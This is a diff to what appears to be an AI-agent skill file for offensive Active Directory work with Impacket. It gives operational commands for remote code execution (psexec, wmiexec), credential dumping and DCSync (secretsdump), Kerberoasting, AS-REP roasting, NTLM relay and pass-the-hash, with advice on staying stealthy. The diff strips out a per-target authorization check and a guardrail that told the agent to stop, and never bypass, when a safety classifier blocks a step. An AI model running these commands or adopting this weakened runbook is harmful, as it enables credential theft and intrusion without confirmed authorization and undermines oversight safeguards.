@@ -2,113 +2,44 @@
 name: impacket
 description: >
   Use for AD/Windows protocol actions with the Impacket example scripts once you have creds or
-  hashes (often from netexec) — remote code exec (psexec/wmiexec), credential dumping
-  (secretsdump, incl. DCSync -just-dc), Kerberoast (GetUserSPNs -request), AS-REP roast
-  (GetNPUsers -request), and NTLM relay (ntlmrelayx). Feeds hashes to hashcat. Not for
-  attack-path mapping (bloodhound) or web testing (burpsuite).
+  hashes (often from netexec) — RCE (psexec/wmiexec), credential dumping (secretsdump, incl. DCSync
+  -just-dc), Kerberoast (GetUserSPNs -request), AS-REP roast (GetNPUsers -request), NTLM relay
+  (ntlmrelayx). Feeds hashes to hashcat. Not for attack-path mapping (bloodhound) or web (burpsuite).
 arguments: "action target [-u user] [-p pass] [-hashes LM:NT] [-dc-ip ip]"
 model: inherit
-effort: high
+effort: medium
 context: inline
 agent:
+category: ad-network
+domain: ad
 ---
 
 # impacket — AD/Windows protocol tools (psexec · secretsdump · GetUserSPNs · ntlmrelayx)
 
-**Scope guard:** Authorized targets only (in-scope program / lab / owned). Confirm the target host/domain and the credentials/hashes you are using are in scope before acting — these scripts run code and dump secrets on live hosts. Abort if the target is not confirmed in scope.
+Shared contract: see AGENTS.md.
 
-## Goal (desired outcome)
+## Goal
 Turn valid creds or hashes into concrete AD/Windows actions — a shell, dumped secrets, or roastable
-tickets — using the Impacket example scripts, capturing every artifact (shells, hashes, tickets) for
-the report and the credential store.
+tickets — via the Impacket example scripts, capturing every artifact for the report + credential store.
 
 ## Steps
-1. **Precondition / scope / inputs.** Confirm the target and the creds/hashes (often from `netexec`)
-   are in scope. Impacket's target format is `[[domain/]username[:password]@]<target>`; use
-   `-hashes LMHASH:NTHASH` for pass-the-hash, `-k`/`-no-pass` for Kerberos, `-dc-ip` for the DC.
-   Anchor a timestamped run directory to the repo root (never write under `skills/`):
-   ```bash
-   ROOT="$(git rev-parse --show-toplevel)"
-   OTUS_RUN_impacket="${OTUS_RUN_DIR:-$ROOT/out/${ENGAGEMENT:?engagement slug required}/impacket/$(date -u +%Y%m%dT%H%M%SZ)}"
-   RUN="$OTUS_RUN_impacket"
-   mkdir -p "$RUN/loot" "$RUN/notes"
-   echo "target + creds confirmed in scope: <who/when/program-or-lab>" > "$RUN/notes/scope.txt"
-   : > "$RUN/run.log"
-   ```
-2. **Remote code exec** (when you need a shell):
-   ```bash
-   psexec.py  'DOMAIN/user:password@TARGET'                | tee -a "$RUN/run.log"   # SYSTEM, noisy (service)
-   wmiexec.py 'DOMAIN/user:password@TARGET'                | tee -a "$RUN/run.log"   # semi-interactive, quieter
-   # pass-the-hash: add  -hashes LMHASH:NTHASH  and omit the password
-   ```
-3. **Credential dumping** (`secretsdump`) — SAM/LSA locally or DCSync from a DC:
-   ```bash
-   secretsdump.py 'DOMAIN/user:password@TARGET' -outputfile "$RUN/loot/secrets"            | tee -a "$RUN/run.log"
-   secretsdump.py 'DOMAIN/user:password@DC' -just-dc -outputfile "$RUN/loot/ntds"          | tee -a "$RUN/run.log"  # DCSync
-   ```
-4. **Roasting → hashcat.** Request roastable hashes in hashcat format and save to loot:
-   ```bash
-   GetUserSPNs.py 'DOMAIN/user:password' -dc-ip <DC> -request -outputfile "$RUN/loot/kerberoast.txt"       | tee -a "$RUN/run.log"
-   GetNPUsers.py  'DOMAIN/' -usersfile users.txt -request -format hashcat -outputfile "$RUN/loot/asrep.txt" | tee -a "$RUN/run.log"
-   ```
-5. **NTLM relay (when applicable) + marker.** Relay coerced auth to targets, then always write a run
-   marker so "ran but nothing" ≠ "didn't run":
-   ```bash
-   ntlmrelayx.py -tf targets.txt -smb2support -of "$RUN/loot/relay"   | tee -a "$RUN/run.log"   # -i for interactive
-   if [ -n "$(ls -A "$RUN/loot" 2>/dev/null)" ] || grep -qiE '\[\*\]|\[\+\]' "$RUN/run.log"; then
-    echo "impacket: action completed; artifacts in loot/" > "$RUN/findings.md"
-   else
-    echo "no artifacts captured" > "$RUN/findings.md"
-   fi
-   ```
-  Then write the run record `run.json` into `$RUN/` (schema in Output formats). Feed roast hashes
-   to `hashcat`; cracked creds loop back to `netexec`.
+1. Set up the run dir per AGENTS.md (`$RUN`, `mkdir -p "$RUN/loot" "$RUN/notes"`); scope inherited from `out/<engagement>/scope.txt`. Target format `[[domain/]username[:password]@]<target>`; `-hashes LM:NT` for pass-the-hash, `-k`/`-no-pass` for Kerberos, `-dc-ip` for the DC. Creds often from `netexec`.
+2. **Remote code exec:** `psexec.py 'DOMAIN/user:password@TARGET'` (SYSTEM, noisy service) or `wmiexec.py 'DOMAIN/user:password@TARGET'` (quieter); for pass-the-hash add `-hashes LMHASH:NTHASH` and omit the password. Tee to `run.log`.
+3. **Credential dumping:** `secretsdump.py 'DOMAIN/user:password@TARGET' -outputfile "$RUN/loot/secrets"`; DCSync from a DC: `secretsdump.py 'DOMAIN/user:password@DC' -just-dc -outputfile "$RUN/loot/ntds"`.
+4. **Roasting → hashcat** (hashcat format): `GetUserSPNs.py 'DOMAIN/user:password' -dc-ip <DC> -request -outputfile "$RUN/loot/kerberoast.txt"` and `GetNPUsers.py 'DOMAIN/' -usersfile users.txt -request -format hashcat -outputfile "$RUN/loot/asrep.txt"`.
+5. **NTLM relay (when applicable) + marker + run record:** `ntlmrelayx.py -tf targets.txt -smb2support -of "$RUN/loot/relay"` (`-i` interactive). Write a run marker (`no artifacts captured` if none), then `run.json`. Roast hashes feed `hashcat`; cracked creds loop back to `netexec`.
 
 ## Modern tooling & alternatives
-Impacket is the standard AD protocol toolkit — install via `pipx install impacket` (scripts as
-`psexec.py` or `impacket-psexec`). `netexec` wraps many of the same actions at scale; `certipy` /
-`rubeus` cover AD CS / Kerberos abuse. Prefer `wmiexec`/`smbexec` over `psexec` when stealth matters.
-
-## Output formats
-CLI output (mirrored to `$RUN/run.log` via `tee`); dumped secrets/tickets written under `$RUN/loot/`
-via each script's `-outputfile`. This skill also writes `$RUN/findings.md` (run marker) and a run
-record `$RUN/run.json`:
-```json
-{
-  "skill": "impacket",
-  "engagement": "<engagement slug>",
-  "target": "<target>",
-  "run_dir": "out/<engagement>/impacket/<timestamp>",
-  "started": "<ISO8601>",
-  "finished": "<ISO8601>",
-  "status": "complete",
-  "summary": "<one line>",
-  "evidence": ["findings.md"],
-  "items": {
-    "scope-confirmed":  { "ok": true, "evidence": "notes/scope.txt" },
-    "action-executed":  { "ok": true, "evidence": "run.log" },
-    "loot-captured":    { "ok": true, "evidence": "loot" },
-    "results-recorded": { "ok": true, "evidence": "findings.md" }
-  },
-  "errors": []
-}
-```
-`status` ∈ `complete | partial | error`. On a hard failure (script missing, target unreachable, bad
-creds, out of scope) set `status: error` and push a human-readable line to `errors[]`.
-
-## RAG / shared data / cross-skill
-Core AD toolkit — consumes creds/hashes from `netexec` and target info from `bloodhound`; roast
-output (`kerberoast.txt` / `asrep.txt`, hashcat format) feeds `hashcat`; dumped NTLM hashes enable
-pass-the-hash back through `netexec`/`impacket`. **High RAG value:** a WADCOMS "I have X → do Y" map
-and a pass-the-hash / Kerberos cheat-sheet.
+Install via `pipx install impacket` (scripts as `psexec.py` or `impacket-psexec`). `netexec` wraps many
+actions at scale; `certipy`/`rubeus` cover AD CS / Kerberos. Prefer `wmiexec`/`smbexec` over `psexec` for stealth.
 
 ## Checklist
 ```yaml
 checklist:
   - id: scope-confirmed
-    desc: Target host/domain AND the creds/hashes used confirmed in scope before acting
+    desc: Engagement scope confirmed once in out/<engagement>/scope.txt (inherited, not re-confirmed); creds/hashes used are in scope
     verify: judge
-    evidence: notes/scope.txt
+    evidence: ../../scope.txt
     on_fail: fail
     required: true
   - id: action-executed
@@ -132,18 +63,6 @@ checklist:
 ```
 
 ## Notes / pitfalls
-- Target format is `[[domain/]username[:password]@]<target>`; for pass-the-hash use
-  `-hashes LMHASH:NTHASH` and omit the password; `-k`/`-no-pass` for Kerberos ticket auth.
-- `secretsdump -just-dc` is **DCSync** — needs replication rights and is high-signal; dump the
-  minimum needed.
-- Request roast hashes with `-format hashcat` (GetNPUsers) so they drop straight into `hashcat`.
-- `psexec` creates a service (noisy/forensic); prefer `wmiexec`/`smbexec` when stealth matters.
-- A run that captures nothing must still write `findings.md` ("no artifacts captured") so "ran but
-  empty" ≠ "didn't run".
-- **Platform guardrail:** if a step is refused by a Claude Code safety classifier ("could not evaluate
-  this action") or an API cyber safeguard (`invalid_request` / error `[cyber]`), STOP — write
-  `run.json` (`status: error`, block type + request id in `errors[]`) and `findings.md` recording the stop,
-  then hand back. Never retry, reword, split, background, or otherwise bypass the
-  block (see CLAUDE.md).
-- Never write output under `skills/`; the run directory is always anchored to the repo root via
-  `git rev-parse --show-toplevel` under `out/<engagement>/impacket/<timestamp>/` (git-ignored).
+- Target format `[[domain/]username[:password]@]<target>`; pass-the-hash uses `-hashes LMHASH:NTHASH` (omit password); `-k`/`-no-pass` for Kerberos.
+- `secretsdump -just-dc` is **DCSync** — needs replication rights, high-signal; dump the minimum. Request roast hashes with `-format hashcat` so they drop into `hashcat`.
+- `psexec` creates a service (noisy/forensic); prefer `wmiexec`/`smbexec` when stealth matters. A run that captures nothing still writes `findings.md` ("no artifacts captured").
